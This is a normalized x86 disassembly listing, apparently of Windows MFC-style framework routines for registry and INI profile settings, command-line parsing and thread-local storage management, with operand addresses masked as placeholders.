mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x80 ]
push eax
call sub_4479eb
mov ecx [ esi + 0x98 ]
test ecx ecx
je r-xdata
and [ esi + 0x58 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44af64
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_453bed
push esi
mov esi ecx
call sub_43e71a
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi ]
push 0x0
push 0x14
push 0x41e
mov ecx esi
call [ eax + 0xa0 ]
push 0x1
pop eax
mov edx [ esi ]
push 0x0
push eax
push 0x425
mov ecx esi
call [ edx + 0xa0 ]
sub_453c2c
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
lea eax [ ebp - 0x34 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x18
mov esi ecx
push edi
call [ GetObjectA@IAT ]
mov eax [ esi + 0x80 ]
lea ebx [ esi + 0x80 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x30 ]
cdq
idiv [ esi + 0x88 ]
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] ecx
push edx
mov [ ebp - 0x14 ] ecx
push ecx
push 0x42e
mov ecx esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] eax
mov eax [ esi ]
call [ eax + 0xa0 ]
mov esi eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push eax
mov eax [ ebp - 0x30 ]
cdq
idiv [ esi + 0x88 ]
mov ecx [ esi ]
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
mov ecx esi
push eax
mov eax [ ebp + 0x8 ]
push 0x413
call [ eax + 0xa0 ]
mov esi eax
neg esi
sbb esi esi
inc esi
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn 0x4
push ebx
call sub_4479eb
mov [ ebx ] edi
test esi esi
je r-xdata
sub_453cfa
mov eax sub_463854
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_45430f
xor edi edi
mov [ esi ] r--data
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
mov [ esi + 0x78 ] edi
push [ ebp + 0x8 ]
call sub_42f9ae
pop ecx
mov [ esi + 0x78 ] eax
jmp r-xdata
call sub_45357b
mov ebx eax
push sub_4535ed
lea ecx [ ebx + 0x1070 ]
call sub_45518e
mov [ eax + 0x4 ] esi
call [ GetCurrentThread@IAT ]
mov [ esi + 0x28 ] eax
call [ GetCurrentThreadId@IAT ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x2c ] eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x68 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0xb2 ] di
mov [ esi + 0xb0 ] di
mov [ esi + 0x70 ] edi
mov [ esi + 0xac ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0xb8 ] 0x200
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_453e00
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0x80 ] 0x0
lea eax [ ecx + 0x80 ]
jne r-xdata
and [ rw-data ] 0x0
mov eax [ ecx ]
push 0x0
call [ eax + 0xc ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ eax ] edx
push 0x1
pop eax
retn
sub_453e44
mov eax sub_46386a
call sub_42dc88
push ecx
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push 0x0
push r--data
push r--data
mov ecx esi
call sub_45482c
mov ecx [ ebp - 0xc ]
mov [ esi + 0xb4 ] eax
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push 0x20
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1e
push [ ebp + 0x8 ]
push r--data
push r--data
push 0x0
call sub_4439ba
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0xa8 ] eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
sub_453ec0
push 0x1
pop eax
cmp [ rw-data ] eax
jle r-xdata
retn 0x4
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x1
inc ecx
pop edx
cmp al 0x2f
jne r-xdata
mov ecx [ rw-data ]
lea esi [ eax + 0x1 ]
xor edx edx
xor ebx ebx
mov ecx [ ecx + eax * 4 ]
cmp esi [ rw-data ]
mov al [ ecx ]
sete bl
cmp al 0x2d
je r-xdata
pop edi
pop esi
pop ebx
mov eax [ edi ]
push ebx
push edx
push ecx
mov ecx edi
call [ eax + 0xc ]
mov eax esi
cmp eax [ rw-data ]
jl r-xdata
sub_453f13
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0x14 ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x18 ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x1c ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x20 ] ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x1
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn
sub_453f6e
mov eax sub_46389d
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ esi + 0x1c ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x14 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_453fc5
cmp [ esp + 0x8 ] 0x0
push esi
push [ esp + 0x8 ]
mov esi ecx
je r-xdata
call sub_4540ac
call sub_453fee
jmp r-xdata
push [ esp + 0x10 ]
mov ecx esi
call sub_4540fc
pop esi
retn 0xc
sub_453fee
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ lstrcmpA@IAT ]
push esi
push edi
push r--data
mov esi ecx
push ebx
call ebp
test eax eax
jne r-xdata
push r--data
push ebx
call ebp
test eax eax
jne r-xdata
mov [ esi + 0x10 ] 0x3
jmp r-xdata
mov edi [ lstrcmpiA@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
mov [ esi + 0x10 ] 0x2
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov [ esi + 0x10 ] 0x5
push r--data
push ebx
call edi
test eax eax
je r-xdata
push r--data
push ebx
call ebp
test eax eax
jne r-xdata
push r--data
push ebx
call edi
test eax eax
jne r-xdata
push eax
call sub_451750
mov [ esi + 0x10 ] 0x4
jmp r-xdata
push r--data
push ebx
call edi
test eax eax
jne r-xdata
push eax
call sub_451750
mov [ esi + 0x8 ] 0x1
jmp r-xdata
push eax
call sub_451750
mov [ esi + 0xc ] 0x1
and [ esi + 0x4 ] 0x0
jmp r-xdata
sub_4540ac
mov eax ecx
push edi
mov edx [ eax + 0x14 ]
lea ecx [ eax + 0x14 ]
cmp [ edx - 0x8 ] 0x0
je r-xdata
push [ esp + 0x8 ]
call sub_4422d1
mov edx [ eax + 0x10 ]
cmp edx 0x3
jne r-xdata
pop edi
retn 0x4
mov edi [ eax + 0x18 ]
lea ecx [ eax + 0x18 ]
cmp [ edi - 0x8 ] 0x0
je r-xdata
cmp edx edx
jne r-xdata
mov edi [ eax + 0x1c ]
lea ecx [ eax + 0x1c ]
cmp [ edi - 0x8 ] 0x0
je r-xdata
cmp edx edx
jne r-xdata
lea ecx [ eax + 0x20 ]
mov eax [ eax + 0x20 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
sub_4540fc
xor eax eax
cmp [ esp + 0x4 ] eax
je r-xdata
retn 0x4
cmp [ ecx + 0x10 ] eax
push 0x1
pop edx
jne r-xdata
cmp [ ecx + 0x8 ] eax
jne r-xdata
push esi
mov esi [ ecx + 0x14 ]
cmp [ esi - 0x8 ] eax
pop esi
je r-xdata
mov [ ecx + 0x4 ] eax
cmp [ ecx + 0xc ] eax
jne r-xdata
mov [ ecx + 0x10 ] edx
mov eax edx
sub_45412b
mov eax sub_4638b0
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x80 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ esi + 0xa8 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
call sub_45357b
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov eax [ esi + 0x94 ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x98 ]
cmp eax ebx
je r-xdata
push eax
call sub_447a7b
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb0 ]
push edi
mov edi [ GlobalDeleteAtom@IAT ]
cmp ax bx
je r-xdata
push eax
call sub_447a7b
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ rw-data ] ebx
mov ax [ esi + 0xb2 ]
cmp ax bx
je r-xdata
push eax
call edi
mov ecx [ esi + 0xac ]
pop edi
cmp ecx ebx
je r-xdata
push eax
call edi
call sub_45357b
mov ecx [ eax + 0x10 ]
cmp ecx [ esi + 0x78 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp [ eax + 0x4 ] esi
jne r-xdata
mov [ eax + 0x10 ] ebx
push [ esi + 0x78 ]
call sub_42ded6
push [ esi + 0x7c ]
call sub_42ded6
push [ esi + 0x88 ]
call sub_42ded6
push [ esi + 0x8c ]
call sub_42ded6
push [ esi + 0x90 ]
call sub_42ded6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x14
mov ecx esi
mov [ esi + 0x28 ] ebx
call sub_45b2ba
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov [ eax + 0x4 ] ebx
sub_454261
push esi
mov esi ecx
mov ecx [ esi + 0xa8 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
pop esi
retn
push eax
push r--data
push r--data
mov ecx esi
call sub_44acff
sub_454291
push esi
mov esi ecx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
call sub_45357b
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x5
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
mov ecx esi
call sub_454261
mov eax [ esi + 0x38 ]
pop esi
retn
call eax
sub_45430f
mov eax sub_4638c4
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_44195c
xor eax eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] eax
call sub_45434c
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_45434c
push esi
mov esi ecx
push edi
xor edi edi
lea eax [ esi + 0x5c ]
mov [ esi + 0x1c ] edi
push eax
mov [ esi + 0x20 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x64 ] edi
call [ GetCursorPos@IAT ]
mov [ esi + 0x58 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x24 ] 0x1
pop edi
pop esi
retn
sub_4543b4
mov eax sub_4638ed
call sub_42dc88
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push 0x1
mov eax [ edi + 0x10 ]
xor ebx ebx
pop ecx
cmp eax ebx
mov [ ebp - 0x10 ] ecx
je r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
push ebx
push ebx
push ebx
mov edx [ eax ]
push 0xe100
mov ecx eax
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp eax ecx
je r-xdata
cmp [ esi + 0x1c ] ebx
mov ecx esi
call sub_44aaf2
mov edi [ edi + 0x14 ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x7c ]
test eax eax
jmp r-xdata
jle r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax 0x3
jle r-xdata
mov eax [ esi ]
mov [ esi + 0x74 ] ebx
push [ edi + 0x14 ]
mov ecx esi
call [ eax + 0x7c ]
mov eax [ esi + 0x1c ]
lea ebx [ esi + 0xac ]
mov [ ebx ] edi
xor edi edi
push edi
push 0xe108
push 0x111
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
mov [ ebx ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp eax 0x4
je r-xdata
mov eax [ esi + 0x74 ]
mov [ esi + 0x74 ] ebx
mov [ esi + 0xac ] eax
jmp r-xdata
cmp eax 0x5
jne r-xdata
mov ecx esi
call sub_454706
mov ecx esi
call sub_4544f5
cmp [ edi + 0x8 ] ebx
jne r-xdata
cmp [ esi + 0xac ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
push 0xffffffff
push ebx
je r-xdata
push 0x24
call sub_441e89
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push 0xf10c
push 0xf10b
jmp r-xdata
xor eax eax
mov ecx eax
call sub_453f13
jmp r-xdata
call sub_4496ef
mov [ esi + 0xac ] eax
mov [ eax + 0x10 ] 0x5
jmp r-xdata
sub_4544f5
mov eax sub_463910
call sub_42dc88
sub esp 0x120
push ebx
push edi
xor ebx ebx
mov edi ecx
mov [ ebp - 0x14 ] ebx
call sub_44acdb
cmp eax ebx
mov [ ebp - 0x1c ] eax
je r-xdata
cmp [ edi + 0x7c ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
mov ecx edi
push eax
call sub_44aced
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push esi
push r--data
lea ecx [ ebp - 0x10 ]
call sub_4421b6
push [ edi + 0x7c ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_442524
lea eax [ ebp - 0x10 ]
push r--data
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_4423dd
push [ edi + 0x90 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4423dd
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea eax [ ebp - 0x18 ]
mov esi 0x80000001
push eax
push esi
mov ecx edi
call sub_454624
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push esi
call [ RegOpenKeyA@IAT ]
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov edx [ eax ]
push ebx
push ebx
push 0xfffffffc
push ebx
mov ecx eax
call [ edx + 0xc ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x12c ]
push eax
push [ ebp - 0x18 ]
push esi
call [ RegQueryValueA@IAT ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] bl
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
pop esi
lea eax [ ebp - 0x12c ]
push 0x104
push eax
push ebx
push [ ebp - 0x14 ]
call [ RegEnumKeyA@IAT ]
cmp eax 0x103
jne r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x10 ]
mov ecx edi
push eax
push esi
call sub_454624
sub_454634
mov eax sub_463924
call sub_42dc88
sub esp 0x10c
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
push esi
push ecx
mov eax [ eax ]
push eax
push [ ebp + 0x8 ]
call [ RegOpenKeyA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push ebx
mov ebx 0xff
push edi
mov edi [ RegEnumKeyA@IAT ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
push esi
push [ ebp - 0x14 ]
pop edi
cmp esi 0x103
pop ebx
je r-xdata
lea eax [ ebp - 0x118 ]
lea ecx [ ebp - 0x18 ]
push eax
call sub_4421b6
and [ ebp - 0x4 ] esi
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
call sub_454634
mov esi eax
lea ecx [ ebp - 0x18 ]
test esi esi
setne [ ebp - 0xd ]
or [ ebp - 0x4 ] 0xffffffff
call sub_442148
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
push [ ebp + 0x8 ]
call [ RegDeleteKeyA@IAT ]
mov esi eax
cmp esi 0x3f2
jne r-xdata
lea eax [ ebp - 0x118 ]
push ebx
push eax
push 0x0
push [ ebp - 0x14 ]
jmp r-xdata
call edi
mov esi eax
test esi esi
jne r-xdata
sub_454717
push esi
mov esi ecx
push edi
push [ esi + 0x7c ]
call sub_42ded6
push [ esp + 0x10 ]
call sub_42f9ae
push [ esi + 0x90 ]
lea edi [ esi + 0x90 ]
mov [ esi + 0x7c ] eax
call sub_42ded6
push [ esi + 0x78 ]
call sub_42f9ae
add esp 0x10
mov [ edi ] eax
pop edi
pop esi
retn 0x4
sub_454752
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
mov esi 0x2001f
xor edi edi
push eax
push esi
push edi
mov ebx ecx
push r--data
push 0x80000001
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] edi
mov esi [ RegCloseKey@IAT ]
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebx + 0x7c ]
mov ebx [ RegCreateKeyExA@IAT ]
push [ ebp - 0x4 ]
call ebx
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push edi
push esi
push edi
push edi
push edi
push [ eax + 0x90 ]
push [ ebp - 0x8 ]
call ebx
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
call esi
sub_4547e6
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
push edi
mov [ ebp - 0x4 ] esi
call sub_454752
mov edi eax
cmp edi esi
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x2001f
push esi
push esi
push esi
push [ ebp + 0x8 ]
push edi
call [ RegCreateKeyExA@IAT ]
push edi
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
sub_45482c
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ecx + 0x7c ] 0x0
push esi
je r-xdata
push [ ecx + 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetPrivateProfileIntA@IAT ]
push [ ebp + 0x8 ]
call sub_4547e6
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push [ ebp + 0xc ]
mov [ ebp + 0x8 ] 0x4
push esi
call [ RegQueryValueExA@IAT ]
push esi
mov edi eax
call [ RegCloseKey@IAT ]
test edi edi
pop edi
jne r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn 0xc
sub_454898
mov eax sub_463974
call sub_42dc88
mov eax 0x100c
call sub_42f0a0
push edi
xor edi edi
cmp [ ecx + 0x7c ] edi
mov [ ebp - 0x14 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
push [ ebp + 0xc ]
call sub_4547e6
cmp eax edi
mov [ ebp - 0x10 ] eax
jne r-xdata
push [ ecx + 0x90 ]
lea eax [ ebp - 0x1018 ]
push 0x1000
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetPrivateProfileStringA@IAT ]
lea eax [ ebp - 0x1018 ]
push eax
mov [ ebp + 0x14 ] rw-data
mov ecx [ rw-data ]
push ebx
push esi
mov [ ebp + 0xc ] ecx
lea ecx [ ebp - 0x18 ]
mov esi [ RegQueryValueExA@IAT ]
push ecx
lea ecx [ ebp - 0x14 ]
push edi
push ecx
push edi
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
push eax
call esi
mov ebx eax
cmp ebx edi
jne r-xdata
push [ ebp + 0x14 ]
jmp r-xdata
push [ ebp - 0x10 ]
call [ RegCloseKey@IAT ]
pop esi
cmp ebx edi
pop ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0xc ]
push eax
push [ ebp - 0x18 ]
call sub_442578
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
call esi
push 0xffffffff
lea ecx [ ebp + 0xc ]
mov ebx eax
call sub_4425c7
mov ecx [ ebp + 0x8 ]
call sub_4421b6
push [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
call sub_4421b6
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call sub_441ebd
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call sub_442148
jmp r-xdata
sub_4549a9
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
je r-xdata
push sub_453064
mov ecx rw-data
call sub_455223
mov esi eax
cmp [ esi + 0x4 ] edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov [ esi + 0xc ] sub_437f80
mov [ esi + 0x10 ] sub_437ff0
mov [ esi + 0x14 ] sub_4380b0
mov [ esi + 0x18 ] sub_438230
mov [ esi + 0x1c ] sub_4386d0
mov [ esi + 0x20 ] sub_4385d0
mov [ esi + 0x24 ] sub_4389b0
mov [ esi + 0x28 ] sub_4382d0
mov [ esi + 0x2c ] sub_438410
call sub_45357b
push [ eax + 0x8 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_45357b
push [ eax + 0x8 ]
call [ esi + 0x14 ]
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
sub_454a5a
mov eax sub_463cad
call sub_42dc88
push ecx
push 0x118
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_458536
sub_454b72
push esi
mov ecx rw-data
call sub_426554
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_446b68
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_454d31
mov edx [ ecx ]
test edx edx
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp edx esi
jne r-xdata
xor eax eax
jmp r-xdata
test edx edx
je r-xdata
mov eax [ ecx + 0x4 ]
mov eax [ eax + esi ]
mov [ ecx ] eax
jmp r-xdata
retn 0x4
pop esi
mov ecx [ ecx + 0x4 ]
push edi
push 0x1
pop eax
test edx edx
pop edi
je r-xdata
mov edx edi
test edx edx
jne r-xdata
mov eax [ ecx + esi ]
mov [ ecx + edx ] eax
mov edi [ ecx + edx ]
cmp edi esi
je r-xdata
sub_454da9
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_43b7b5
sub_454deb
push esi
mov esi ecx
push edi
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call [ TlsFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
push 0x0
push eax
mov ecx esi
call sub_45509c
test edi edi
mov eax edi
jne r-xdata
add esi 0x1c
push esi
call [ DeleteCriticalSection@IAT ]
pop edi
pop esi
retn
push eax
call [ GlobalHandle@IAT ]
mov edi eax
push edi
call [ GlobalUnlock@IAT ]
push edi
call [ GlobalFree@IAT ]
sub_454e42
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_42dc30
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_43b7b5
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_454f54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
